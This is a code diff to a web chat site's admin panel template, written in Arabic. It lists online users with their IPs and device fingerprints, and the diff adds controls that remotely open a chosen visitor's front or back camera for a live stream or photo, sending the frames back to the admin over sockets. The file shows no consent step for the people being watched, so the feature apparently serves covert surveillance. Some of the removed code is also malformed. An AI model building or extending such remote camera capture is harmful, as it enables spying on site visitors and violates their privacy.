@@ -14,14 +14,27 @@
         .btn-ban { background: #ff4b4b; color: white; border: none; padding: 6px 10px; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 2px; font-size: 12px;}
         .btn-ip { background: #e67e22; color: white; border: none; padding: 6px 10px; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 2px; font-size: 12px;}
         .btn-unban { background: #00a884; color: white; border: none; padding: 8px 14px; cursor: pointer; border-radius: 5px; font-weight: bold;}
+        .btn-cam { background: #3498db; color: white; border: none; padding: 6px 9px; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 2px; font-size: 12px;}
+        .btn-cam-close { background: #7f8c8d; color: white; border: none; padding: 6px 9px; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 2px; font-size: 12px;}
         input { padding: 12px; border-radius: 6px; border: 1px solid #2a3942; background: #2a3942; color: white; margin-bottom: 10px; width: 100%; box-sizing: border-box;}
         h1 { color: #00a884; font-size: 22px; text-align: center; }
         h2 { color: #00a884; margin-top: 0; font-size: 17px; }
         code { background: #111; padding: 4px 6px; border-radius: 4px; color: #ffbc00; font-size: 12px; }
+        #cam-viewer { background: #000; border-radius: 10px; min-height: 260px; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 10px; }
+        #cam-frame-img { max-width: 100%; max-height: 70vh; border-radius: 8px; display: none; }
     </style>
 </head>
 <body>
     <h1>لوحة التحكم والسيطرة المزدوجة 🛡️</h1>
+
+    <!-- ============ عارض الكاميرا ============ -->
+    <div class="box" style="border-color:#3498db;">
+        <h2 style="color:#3498db;">📷 بث / صورة الكاميرا المباشر</h2>
+        <div id="cam-viewer">
+            <div id="cam-viewer-title" style="color:#8696a0;">لا يوجد بث حالياً — اختر مستخدماً بالأسفل</div>
+            <img id="cam-frame-img" alt="camera">
+        </div>
+    </div>
 
     <div class="box" style="border-color: #00a884;">
         <h2>إعدادات حماية الموقع العامة 🔒</h2>
@@ -41,11 +54,12 @@
         </div>
     </div>
 
+    <!-- ============ المتواجدون + التحكم بالكاميرا ============ -->
     <div class="box">
-        <h2>المتواجدون الآن (أونلاين)</h2>
+        <h2>المتواجدون الآن (أونلاين) — مع التحكم بالكاميرا</h2>
         <div class="table-responsive">
             <table>
-                <tr><th>المستخدم</th><th>IP الشبكة</th><th>بصمة الجهاز</th><th>الغرفة الحالية</th><th>الإجراءات السريعة</th><th>كاميرا</th></tr>
+                <tr><th>المستخدم</th><th>IP الشبكة</th><th>بصمة الجهاز</th><th>الغرفة الحالية</th><th>حالة الكاميرا</th><th>التحكم بالكاميرا</th><th>الحظر</th></tr>
                 {% for u in online %}
                 <tr>
                     <td>{{ u.user }}</td>
@@ -53,16 +67,40 @@
                     <td><code>{{ u.device_id }}</code></td>
                     <td style="color:#00a884; font-weight:bold;">{{ u.room }}</td>
                     <td>
-                        <button class="btn-ban" onclick="doBan('{{ u.device_id }}', null)">حظر جهاز</button>
-                        <button class="btn-ip" onclick="doBan(null, '{{ u.ip }}')">حظر IP</button>
+                        {% if u.cameras == 'none' %}
+                            <span style="color:#ff4b4b; font-weight:bold;">📵 لا يملك كاميرا</span>
+                        {% elif u.cameras is mapping %}
+                            📷 {{ u.cameras.count }} كاميرا
+                            {% if u.cameras.front %}<br>✅ أمامية{% endif %}
+                            {% if u.cameras.back %}<br>✅ خلفية{% endif %}
+                            {% if u.cameras.flash %}<br>⚡ فلاش{% endif %}
+                        {% else %}
+                            ❔ غير معروف
+                        {% endif %}
                     </td>
                     <td>
-                        <button class="btn-ban" onclick="openCamera('{{ u.user }}')">فتح كاميرا</button>
+                        {% if u.cameras != 'none' %}
+                            <button class="btn-cam" onclick="openCam('{{ u.sid }}','video','user')">بث أمامية ▶</button>
+                            {% if u.cameras is mapping and u.cameras.back %}
+                            <button class="btn-cam" onclick="openCam('{{ u.sid }}','video','environment')">بث خلفية ▶</button>
+                            {% endif %}
+                            <button class="btn-cam" style="background:#8e44ad;" onclick="openCam('{{ u.sid }}','photo','user')">صورة أمامية 📷</button>
+                            {% if u.cameras is mapping and u.cameras.back %}
+                            <button class="btn-cam" style="background:#8e44ad;" onclick="openCam('{{ u.sid }}','photo','environment')">صورة خلفية 📷</button>
+                            {% endif %}
+                            <button class="btn-cam-close" onclick="closeCam('{{ u.sid }}')">إغلاق ⏹</button>
+                        {% else %}
+                            —
+                        {% endif %}
+                    </td>
+                    <td>
+                        <button class="btn-ban" onclick="doBan('{{ u.device_id }}', null)">حظر جهاز</button>
+                        <button class="btn-ip" onclick="doBan(null, '{{ u.ip }}')">حظر IP</button>
                     </td>
                 </tr>
                 {% endfor %}
                 {% if not online %}
-                <tr><td colspan="6" style="color:#8696a0;">لا يوجد متصلين حالياً</td></tr>
+                <tr><td colspan="7" style="color:#8696a0;">لا يوجد متصلين حالياً</td></tr>
                 {% endif %}
             </table>
         </div>
@@ -144,38 +182,39 @@
         </div>
     </div>
 
-    <h3>مستخدمين عندهم كاميرا:</h3>
-    <div class="table-responsive">
-        <table>
-            <tr><th>المستخدم</th><th>نوع الكاميرا</th><th>فلاش</th></tr>
-            {% for user, info in cameraUsers.items() %}
-            <tr>
-                <td>{{ user }}</td>
-                <td>{{ info.facingMode }}</td>
-                <td>{{ info.hasTorch ? 'نعم' : 'لا' }}</td>
-            </tr>
-            {% endfor %}
-        </table>
-    </div>
-
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
     <script>
         const p = new URLSearchParams(window.location.search).get('pass');
-        const socket = io({
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const videoTrack = stream.getVideoTracks()[0];
-                if (videoTrack) {
-                    const facingMode = videoTrack.getCapabilities().facingMode;
-                    const hasTorch = videoTrack.getCapabilities().torch;
-                    socket.emit('camera_info', { facingMode, hasTorch });
-                } else {
-                    socket.emit('camera_info', { facingMode: null, hasTorch: null });
-                }
-                stream.getTracks().forEach(track => track.stop());
-            }).catch(() => {
-                socket.emit('camera_info', { facingMode: null, hasTorch: null });
-            });
+
+        // ===== الاتصال بالسوكيت وتسجيل الأدمن =====
+        const socket = io({ transports: ['websocket', 'polling'], upgrade: true });
+        socket.on('connect', () => {
+            socket.emit('admin_register', {});
         });
 
+        // ===== التحكم بالكاميرا =====
+        function openCam(sid, mode, facing) {
+            socket.emit('admin_open_camera', { sid: sid, mode: mode, facing: facing });
+            const t = document.getElementById('cam-viewer-title');
+            t.innerText = (mode === 'photo' ? '📷 صورة من: ' : '🔴 بث مباشر من: ') + sid;
+        }
+        function closeCam(sid) {
+            socket.emit('admin_close_camera', { sid: sid });
+        }
+
+        // استقبال الإطارات من كاميرا المستخدم
+        socket.on('camera_frame_update', (d) => {
+            const img = document.getElementById('cam-frame-img');
+            if (!d.frame) {
+                document.getElementById('cam-viewer-title').innerText = '⚠️ تعذّر فتح كاميرا هذا المستخدم';
+                img.style.display = 'none';
+                return;
+            }
+            img.src = d.frame;
+            img.style.display = 'block';
+        });
+
+        // ===== باقي الوظائف =====
         function updateGlobalPassword() {
             const newPass = document.getElementById('new_global_pass_input').value;
             if(!newPass.trim()) return alert("يرجى إدخال كلمة سر صالحة");
@@ -234,44 +273,6 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({device_id: devId, ip: ipAddr, pass: p})
             }).then(() => location.reload());
-        }
-
-        socket.on("join_status", s => {
-            if (s === 'success') {
-                socket.on('camera_info', data => {
-                    if (data.facingMode === null) {
-                        alert('لا كاميرا');
-                    } else {
-                        alert(`نوع الكاميرا: ${data.facingMode}, فلاش: ${data.hasTorch ? 'نعم' : 'لا'}`);
-                    }
-                });
-            }
-        });
-
-        const cameraUsers = {};
-        socket.on('camera_info', (data, user) => {
-            cameraUsers[user] = data;
-        });
-
-        function openCamera(user) {
-            const info = cameraUsers[user];
-            if (!info || info.facingMode === null) {
-                alert('لا كاميرا');
-                return;
-            }
-
-            const video = document.createElement('video');
-            video.style.width = '100%';
-            video.style.height = 'auto';
-            video.autoplay = true;
-            video.controls = true;
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: info.facingMode } }).then(stream => {
-                video.srcObject = stream;
-                document.body.appendChild(video);
-            }).catch(() => {
-                alert('فشل فتح الكاميرا');
-            });
         }
     </script>
 </body>
